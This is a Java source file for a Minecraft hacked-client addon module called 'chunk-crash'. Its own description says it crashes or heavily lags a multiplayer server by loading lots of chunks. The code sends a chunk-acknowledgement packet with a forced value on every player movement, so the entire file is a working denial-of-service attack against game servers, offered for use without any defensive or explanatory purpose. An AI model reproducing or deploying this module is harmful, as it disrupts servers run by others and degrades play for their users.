package dev.saturn.addon.modules.Crash;

import dev.saturn.addon.Saturn;
import meteordevelopment.meteorclient.events.entity.player.PlayerMoveEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.AcknowledgeChunksC2SPacket;

public class ChunkCrash extends Module {
    public ChunkCrash() {
        super(Saturn.Crash, "chunk-crash", "Crashes (makes huge lag) the server by loading lots of chunks.");
    }

    @EventHandler
    public void onPlayerMove(PlayerMoveEvent e) {
        var packet = new AcknowledgeChunksC2SPacket(34);
        Saturn.mc.player.networkHandler.sendPacket(packet);
    }
}